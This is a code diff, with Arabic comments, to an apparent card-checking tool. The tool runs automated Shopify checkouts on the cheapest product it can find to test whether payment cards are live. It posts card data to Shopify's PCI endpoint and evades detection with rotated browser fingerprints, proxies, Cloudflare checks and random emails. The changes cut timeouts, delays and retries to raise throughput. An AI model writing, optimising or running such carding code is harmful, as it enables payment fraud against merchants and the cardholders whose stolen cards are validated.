@@ -1,3 +1,5 @@
+# auto_async.py - نسخة معدلة للسرعة
+
 from __future__ import annotations
 
 import asyncio
@@ -63,8 +65,13 @@ check_submit_errors = _auto.check_submit_errors
 generate_attempt_token = _auto.generate_attempt_token
 generate_page_id = _auto.generate_page_id
 
+# ===== تعديل: تقليل عدد الصفحات =====
+MAX_PRODUCT_PAGES = 2  # من 5 إلى 2
+MAX_PRODUCT_PRICE = 20.0
+MIN_PRODUCT_PRICE = 0.50
+
 class AsyncTLSClient:
-    def __init__(self, timeout=32, proxy_url=None, impersonate=None, user_agent=None):
+    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):  # timeout من 22 إلى 12
         self.timeout = timeout
         self.proxy_url = proxy_url
         self.impersonate = impersonate or random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
@@ -97,15 +104,16 @@ class AsyncTLSClient:
     async def __aexit__(self, *args):
         await self.close()
 
+    # ===== تعديل: تقليل التأخير العشوائي =====
     async def get(self, url, **kwargs):
-        await asyncio.sleep(random.uniform(0.05, 0.15))
+        await asyncio.sleep(random.uniform(0.01, 0.05))
         kwargs.setdefault('timeout', self.timeout)
         if self._session is None:
             self._session = self._make_session()
         return await self._session.get(url, **kwargs)
 
     async def post(self, url, data=None, json=None, **kwargs):
-        await asyncio.sleep(random.uniform(0.05, 0.15))
+        await asyncio.sleep(random.uniform(0.01, 0.05))
         kwargs.setdefault('timeout', self.timeout)
         if self._session is None:
             self._session = self._make_session()
@@ -116,88 +124,81 @@ class AsyncTLSClient:
             await self._session.close()
             self._session = None
 
-MAX_PRODUCT_PAGES = 5
-
 def _is_cf_body(body: str) -> bool:
     lo = body.lower()
     return "1003" in body or "cloudflare" in lo or "cf_managed_challenge" in lo or "challenge" in lo
 
-MAX_PRODUCT_PRICE = 20.0
-MIN_PRODUCT_PRICE = 0.50
-MAX_PRODUCT_PAGES = 5
-
 async def find_cheapest_product(client: AsyncTLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
-    """
-    تدور على منتج رخيص في الموقع من غير ما تجيب 429 (النسخة Async)
-    """
-    # ===== 1. جرب تجيب من /collections/all =====
+    # ===== 1. collections/all =====
     try:
         resp = await client.get(f"{shop_url}/collections/all")
         if resp.status_code == 200:
-            html = resp.text
-            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html)
+            html_content = resp.text
+            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
             if product_links:
-                for link in product_links[:5]:
+                # ===== تعديل: تقليل عدد الروابط =====
+                for link in product_links[:3]:
                     if not link.startswith('http'):
                         link = shop_url + link
                     
                     resp = await client.get(link)
                     if resp.status_code == 200:
-                        html = resp.text
-                        variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html)
+                        html_content = resp.text
+                        variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
                         if not variant_match:
-                            variant_match = re.search(r'data-variant-id="(\d+)"', html)
+                            variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
                         if variant_match:
                             variant_id = variant_match.group(1)
-                            price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html)
+                            price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
                             if price_match:
                                 price = float(price_match.group(1))
                                 if min_price <= price <= max_price:
-                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html)
+                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
                                     product_id = product_match.group(1) if product_match else ""
-                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html)
+                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
                                     title = title_match.group(1) if title_match else "Product"
                                     return title, product_id, "", variant_id, str(price)
     except:
         pass
     
-    # ===== 2. جرب تجيب من /search =====
+    # ===== 2. search =====
     try:
         resp = await client.get(f"{shop_url}/search?q=*")
         if resp.status_code == 200:
-            html = resp.text
-            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html)
+            html_content = resp.text
+            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
             if product_links:
-                for link in product_links[:5]:
+                for link in product_links[:3]:
                     if not link.startswith('http'):
                         link = shop_url + link
                     
                     resp = await client.get(link)
                     if resp.status_code == 200:
-                        html = resp.text
-                        variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html)
+                        html_content = resp.text
+                        variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
                         if not variant_match:
-                            variant_match = re.search(r'data-variant-id="(\d+)"', html)
+                            variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
                         if variant_match:
                             variant_id = variant_match.group(1)
-                            price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html)
+                            price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
                             if price_match:
                                 price = float(price_match.group(1))
                                 if min_price <= price <= max_price:
-                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html)
+                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
                                     product_id = product_match.group(1) if product_match else ""
-                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html)
+                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
                                     title = title_match.group(1) if title_match else "Product"
                                     return title, product_id, "", variant_id, str(price)
     except:
         pass
     
-    # ===== 3. products.json (آخر حل) =====
+    # ===== 3. products.json =====
     best_price = float('inf')
     product_title = product_id = variant_id = price_str = product_handle = ""
     page = 1
+    # ===== تعديل: تقليل عدد الصفحات =====
     while page <= MAX_PRODUCT_PAGES:
-        resp = await client.get(f"{shop_url}/products.json?limit=10&page={page}")
+        resp = await client.get(f"{shop_url}/products.json?limit=5&page={page}")  # limit من 10 إلى 5
         if resp.status_code != 200:
             break
         try:
@@ -227,7 +228,6 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str, min_price
     if not product_title:
         raise Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
     return product_title, product_id, product_handle, variant_id, price_str
-
 
 _PAGE_HEADERS = {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -329,12 +329,13 @@ async def send_pci_session(ident_sig: str, card_number: str, card_name: str, car
         "shopify-identification-signature": ident_sig,
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
-    async with AsyncSession(impersonate="chrome124") as session:
+    async with AsyncSession(impersonate="chrome124", timeout=12) as session:  # timeout من 30 إلى 12
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
-        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", data=payload, headers=headers, timeout=30)
+        resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", data=payload, headers=headers, timeout=12)
     return resp.status_code, resp.text
 
+# دوال Proposal (لم تتغير - نفس الكود الأصلي)
 async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str, checkout_token: str, session_token: str, stable_id: str, variant_id: str, price: str, proposal_id: str, build_id: str, source_token: str, currency: str, country: str):
     gql_payload = f'''{{
   "variables": {{
@@ -851,10 +852,7 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str, chec
         raise Exception(f"returned {resp.status_code}")
     return resp.status_code, resp.text
 
-# auto_async.py - فقط الجزء المطلوب من run_checkout_for_card_async
-
-# auto_async.py - الجزء المطلوب تعديله
-
+# ===== الدالة الرئيسية مع التعديلات =====
 async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url: str = "", max_price: float = 20.0) -> CheckResult:
     """
     تشغيل فحص البطاقة مع تحديد أقصى سعر للمنتج
@@ -879,7 +877,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url:
     email = generate_random_email()
     impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
     user_agent = random.choice(USER_AGENTS)
-    client = AsyncTLSClient(timeout=22, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
+    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
     
     try:
         try:
@@ -1040,7 +1038,8 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url:
             current_tax = extract_tax_amount(proposal5_body)
             current_total = total_amount
 
-            for tax_attempt in range(1, 4):
+            # ===== تعديل: تقليل محاولات الضريبة من 4 إلى 2 =====
+            for tax_attempt in range(1, 3):
                 submit_status, submit_body = await send_submit_for_completion(client, shop_url, checkout_url, checkout_token, session_token, stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email, addr, delivery_handle, shipping_amount, current_total, pci_session_id, attempt_token, currency, country, signed_handles, is_digital=is_digital, tax_amount=current_tax)
                 if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                     new_tax = extract_tax_from_rejected(submit_body)
@@ -1080,7 +1079,8 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url:
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
 
-        for poll_num in range(1, 31):
+        # ===== تعديل: تقليل محاولات Polling من 30 إلى 10 =====
+        for poll_num in range(1, 11):
             try:
                 _, poll_body = await send_poll_for_receipt(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token)
                 receipt_type = ""
@@ -1127,23 +1127,24 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str, proxy_url:
                             result.status = CheckStatus.DECLINED
                             result.error = Exception(error_code)
                     return result
-                delay = 200
+                # ===== تعديل: تقليل زمن الانتظار =====
+                delay = 100
                 m2 = poll_delay_re.search(poll_body)
                 if m2:
                     try:
                         d = int(m2.group(1))
                         if d > 0:
-                            delay = d
+                            delay = min(d, 100)
                     except ValueError:
                         pass
-                await asyncio.sleep(min(delay, 200) / 1000.0)
+                await asyncio.sleep(min(delay, 100) / 1000.0)
             except Exception as e:
                 result.status = CheckStatus.ERROR
                 result.error = Exception(f"poll {poll_num} failed: {e}")
                 return result
 
         result.status = CheckStatus.ERROR
-        result.error = Exception("exceeded 30 poll attempts")
+        result.error = Exception("exceeded 10 poll attempts")
         return result
     finally:
         await client.close()
